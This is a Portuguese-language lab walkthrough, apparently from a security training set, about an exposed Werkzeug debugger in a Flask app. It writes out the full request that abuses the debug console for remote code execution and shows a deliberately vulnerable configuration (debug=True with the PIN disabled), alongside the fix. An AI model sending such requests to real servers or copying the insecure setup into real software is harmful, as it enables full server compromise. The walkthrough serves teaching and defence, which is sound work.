# Walkthrough — debug-enabled

A app é uma API Flask minúscula: uma rota recebe um valor, converte pra número e devolve um item. Mande um valor que não é número e a rota quebra — uma **exceção não-tratada**. Num servidor configurado normalmente isso seria um `500` sem graça. Mas esta app roda com `app.run(debug=True)`, o modo de desenvolvimento do Flask, então o erro vira uma **página de debug** interativa do **Werkzeug**: o seu traceback, o seu código-fonte, os caminhos do seu servidor — e um **console** que roda Python no servidor. O PIN do debugger que deveria proteger esse console está desligado. Você quebra a rota de propósito, lê o segredo do console na página, e roda um comando.

A trilha é o **Burp Suite (Repeater)**, do começo ao fim: quebre a rota, leia a página de debug na resposta, extraia o segredo, mande mais um request, e a saída do comando volta na resposta. Nada roda num browser — o código roda no servidor, e a saída dele está ali na resposta HTTP.

## 1. Contexto

Uma API minúscula em `127.0.0.1:8033` (vulnerável) e `127.0.0.1:8133` (corrigida):

- `GET /` — um banner JSON. Não é o alvo.
- `GET /items/<idx>` — converte `idx` pra inteiro e devolve `ITEMS[int(idx)]` como JSON. Um índice válido (`/items/0`) devolve um item; um não-numérico (`/items/abc`) faz o `int()` levantar `ValueError`, e não há `try/except` pra capturar. Essa exceção não-tratada é o gatilho.

Este átomo é **A05 — Security Misconfiguration**: uma feature de desenvolvimento do framework foi deixada habilitada onde o atacante alcança. A lógica da rota é comum e correta; a falha é o modo de deploy.

Termos, definidos uma vez:

- **Werkzeug.** A biblioteca HTTP/WSGI que vem *por baixo* do Flask — o Flask é construído em cima dela, e instalar o Flask instala o Werkzeug (você não instala à parte). Ela fornece o **servidor de desenvolvimento** embutido do Flask e a página de erro interativa. Tudo que "o debugger" faz aqui é do Werkzeug.
- **Servidor de desenvolvimento vs produção.** O `app.run()` inicia o servidor embutido do Werkzeug — leve, feito pra testar local enquanto você programa, e explicitamente *não* pra produção (ele imprime `WARNING: This is a development server. Do not use it in a production deployment.`).
- **WSGI (Web Server Gateway Interface).** O "padrão de encaixe" entre um app web Python e um servidor de verdade. Em produção você roda a app atrás de um **servidor WSGI** — Gunicorn ou uWSGI — que não tem debugger nem servidor de desenvolvimento.
- **Debug mode.** `debug=True` liga o debugger interativo do Werkzeug (e um reloader). Nesse modo uma exceção não-tratada é renderizada como uma página web interativa em vez de um `500` genérico.
- **Traceback.** O relatório de erro do Python: a **pilha de chamadas** (qual função chamou qual), as **variáveis locais** em cada nível, e a mensagem da exceção. Normalmente vai pro log do servidor; em debug mode é renderizado como página web.
- **Console interativo do debugger.** Dentro dessa página, cada frame da pilha tem um **console** — um campo que roda **Python arbitrário dentro do processo do servidor**. Ele existe pra o dev inspecionar o estado ao vivo. Por definição é execução de código arbitrário: quem alcança o console roda o que quiser no servidor.
- **PIN do debugger.** O Werkzeug nominalmente protege o console com um **PIN** impresso no log de startup do servidor. O PIN é *calculado de dados da máquina* (username, machine-id, MAC address), então um atacante determinado consegue derivá-lo — um obstáculo, não uma tranca de verdade. Aqui ele está desligado de vez com `WERKZEUG_DEBUG_PIN=off`.
- **Information disclosure.** Entregar ao atacante detalhe interno — aqui o seu código-fonte, os valores das variáveis e os caminhos de arquivo — que o ajuda a te atacar.
- **RCE (Remote Code Execution).** Rodar comandos arbitrários no servidor.

O exploit inteiro é Burp; a "UI" é a página de debug que o framework renderiza pra você.

## 2. Ver a página de debug vazando (o tell)

Antes de rodar qualquer comando, prove a primeira metade do impacto: a própria quebra te entrega os internos do servidor. Mande o índice malformado pra API vulnerável:

```
GET /items/abc HTTP/1.1
Host: 127.0.0.1:8033
```

A resposta é `500`, mas o corpo é o debugger interativo do Werkzeug — ~14 KB de HTML intitulado **Werkzeug Debugger**. Ele vaza, em ordem:

- A exceção, literal:

  ```
  ValueError: invalid literal for int() with base 10: 'abc'
  ```

- O seu **código-fonte** — a linha exata que quebrou, puxada dos arquivos do servidor:

  ```
  return jsonify({"item": ITEMS[int(idx)]})
  ```

- **Caminhos de arquivo** do servidor, revelando o layout e a versão do framework:

  ```
  File "/app/app.py", line 33, in get_item
  File "/usr/local/lib/python3.11/site-packages/flask/app.py", line 1478, in __call__
  ```

Isso já é **information disclosure** por si só — um finding antes de qualquer código rodar. Agora mande o mesmo request pra API **corrigida** em `127.0.0.1:8133`:

```
GET /items/abc HTTP/1.1
Host: 127.0.0.1:8133
```

A resposta é um `500` seco e genérico — 265 bytes, sem traceback, sem código-fonte, sem console:

```html
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Mesmo input, mesma exceção, duas respostas completamente diferentes. A diferença é a flag debug — segure isso pra seção 7.

## 3. Achar o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A rota:

```python
@app.route("/items/<idx>")
def get_item(idx):
    return jsonify({"item": ITEMS[int(idx)]})
```

e o ponto de entrada:

```python
if __name__ == "__main__":
    os.environ["WERKZEUG_DEBUG_PIN"] = "off"
    app.run(host=os.environ.get("HOST", "127.0.0.1"), port=5000, debug=True)
```

A rota está OK — ela converte um índice e devolve um item. Não há check de autorização faltando nem injection. A pergunta de auditoria não é "a rota tratou o erro?" A exceção é só o *gatilho*. A pergunta é "o que este servidor faz com uma exceção não-tratada?" — e a resposta é dada pelo `debug=True`: ele serve o debugger interativo. O `WERKZEUG_DEBUG_PIN=off` remove a única tranca na frente do console desse debugger. Confirme no log de startup do container:

```
* Debugger is active!
* Debugger PIN disabled. DEBUGGER UNSECURED!
```

O fix é `debug=False`.

## 4. Exploração — rodar um comando pelo console exposto

### 4.1 Baseline legítimo

Um índice válido funciona, idêntico nos dois lados:

```
GET /items/0 HTTP/1.1
Host: 127.0.0.1:8033
```

```json
{"item":"alpha"}
```

A API corrigida em `127.0.0.1:8133` devolve o byte-idêntico `{"item":"alpha"}`. A feature é a mesma nos dois; só o que acontece numa quebra difere.

### 4.2 Quebrar a rota e ler o segredo do console

Mande `GET /items/abc` de novo (seção 2) e procure, no HTML da página de debug, as credenciais do console. Duas coisas vêm embutidas num bloco `<script>` perto do topo:

```javascript
    EVALEX = true,
    EVALEX_TRUSTED = true,
    SECRET = "P5z6WMEJmVJyQnvTVQlt";
```

`EVALEX = true` significa que o console está disponível; `EVALEX_TRUSTED = true` é o Werkzeug te dizendo que o PIN está off, então não há passo de unlock. `SECRET` é o token por-processo que o console exige. Depois ache um **id de frame** — cada frame da pilha na página é um `<div class="frame" id="frame-NNNN">`; pegue o mais interno (o último da página, onde a exceção foi levantada):

```html
<div class="frame" id="frame-139078990912896">
```

> O seu `SECRET` e o id de frame vão diferir destes — eles são gerados por processo do servidor e por exceção. Leia os seus na sua própria página de debug.

### 4.3 Rodar um comando — RCE

O console executa por HTTP com quatro query params na mesma URL: `__debugger__=yes` marca o request como sendo do debugger, `cmd` é o Python a rodar, `frm` é o id do frame em cujo contexto rodar, e `s` é o segredo. Peça pra ele rodar `id`:

```
GET /items/abc?__debugger__=yes&cmd=__import__("os").popen("id").read()&frm=139078990912896&s=P5z6WMEJmVJyQnvTVQlt HTTP/1.1
Host: 127.0.0.1:8033
```

(O valor de `cmd` é URL-encoded no fio — as aspas viram `%22`; o Burp encoda quando você edita a query.)

A resposta é `200`, e o corpo é o console ecoando o seu comando e o resultado dele:

```
>>> __import__("os").popen("id").read()
'uid=0(root) gid=0(root) groups=0(root)'
```

Isso é **RCE**. Você rodou um comando no servidor e a saída dele voltou direto na resposta HTTP — e `uid=0(root)` diz que rodou como root dentro do container. Você não injetou nada na app; o console já estava exposto, e você digitou nele.

> Isto é um lab local: as duas apps bindam em `127.0.0.1`, os dados são dummy, e cada passo rodou no Burp contra o seu container descartável. Mantenha os payloads demonstrativos — `id`, ou `__import__("os").system("touch /tmp/pwned")` pra deixar um marcador inofensivo que você confirma com `docker compose exec vulnerable ls -la /tmp/pwned`. Num alvo real isso é comprometimento total do servidor; nunca rode nada destrutivo, nada que alcance a rede, nada que saia do container.

## 5. O que a vuln NÃO é

Quatro conclusões erradas pra matar.

**Não é que "a rota esqueceu de tratar o erro".** A exceção é só o *gatilho*, não a vuln. Prova de isolamento: o mesmo `/items/abc` no lado corrigido (`debug=False`) levanta a exceção idêntica e devolve um `500` seco — sem console. Envolver a rota num `try/except` esconderia *este* erro específico, mas o debugger de desenvolvimento continuaria ligado, e a *próxima* exceção não-tratada (outra rota, outro input, um bug futuro) reabre o console. Você estaria tratando o sintoma.

**Não é que "faltou o PIN".** O PIN é calculado de dados da máquina (username, machine-id, MAC) — e a própria página de debug vaza vários desses dados (o seu username aparece nos caminhos de arquivo). Um atacante determinado consegue derivá-lo; é um obstáculo, não uma parede. E um console de desenvolvimento não tem por que estar alcançável, pra começar. Ligar o PIN tranca (mal) uma porta que não devia existir neste ambiente.

**Não é injection.** Você não injetou código num parser, num interpretador, ou num shell. Você alcançou um console que o *próprio* framework expõe em modo de desenvolvimento e digitou Python nele. Nada seu "virou código" — a facilidade de execução já estava aberta.

**Não é um bug na aplicação.** O código da rota está correto. A falha é **configuração** — modo de desenvolvimento deixado alcançável —, e é por isso que isto é A05 (Security Misconfiguration) e não um bug de código. Compare com o [`command-injection-basic`](../../A03-injection/command-injection-basic/) e o [`deserialization-pickle`](../../A08-data-integrity-failures/deserialization-pickle/): mesmo teto de RCE, mas lá o dado do atacante vira código; aqui o console de código foi simplesmente deixado aberto.

## 6. Impacto

Dois findings, empilhados. **Information disclosure:** a página de debug entrega o seu código-fonte, as variáveis locais e os caminhos do servidor (seção 2). **RCE:** o console roda Python arbitrário no processo do servidor (seção 4). RCE é o teto — o mesmo teto do [`command-injection-basic`](../../A03-injection/command-injection-basic/) (um shell roda input costurado) e do [`deserialization-pickle`](../../A08-data-integrity-failures/deserialization-pickle/) (um deserializer roda comportamento nos bytes), alcançado aqui por uma porta diferente: um debugger de desenvolvimento exposto. Sem overclaim além disso — é RCE no container da app, o que já é o topo. Num host real exposto à internet, este é um dos caminhos mais rápidos pro comprometimento total, e é por isso que "não suba com debug mode" é regra, não sugestão.

## 7. Por que o fix funciona

Rode a cadeia inteira contra a API corrigida na porta **8133** (veja o [`DIFF.md`](./DIFF.md)). Ela roda com `debug=False`.

- `GET /items/abc` → o `500` seco e genérico da seção 2. Sem traceback, sem código-fonte, sem `SECRET`, sem console.
- O request de eval da seção 4.3 → também só um `500`. Sem o middleware do debugger, o `?__debugger__=yes&cmd=...` é inerte: `/items/<idx>` ainda roda com `idx="abc"`, o `int()` ainda quebra, e você recebe o erro genérico. Não há console pra alcançar, então o `docker compose exec fixed ls -la /tmp/pwned` mostra que o marcador nunca foi criado.

A prova de isolamento: `GET /items/0` devolve um `{"item":"alpha"}` idêntico nas **duas** portas — a feature é a mesma. Só a *quebra* separa os lados (debugger + RCE na 8033, `500` seco na 8133), e essa diferença traça puramente pra flag debug.

O fix é uma coisa só: desligar o debug mode. Não "pôr o PIN" — ele é derivável, e o console não deveria estar exposto de forma alguma. Não "capturar a exceção" — isso esconde um gatilho enquanto o debugger continua ligado pro próximo. `debug=False`, e em produção servir a app atrás de um servidor WSGI de verdade (Gunicorn/uWSGI) que não tem servidor de desenvolvimento nem debugger. Veja o [`DIFF.md`](./DIFF.md) pro diff e por que as meias-correções não se sustentam.
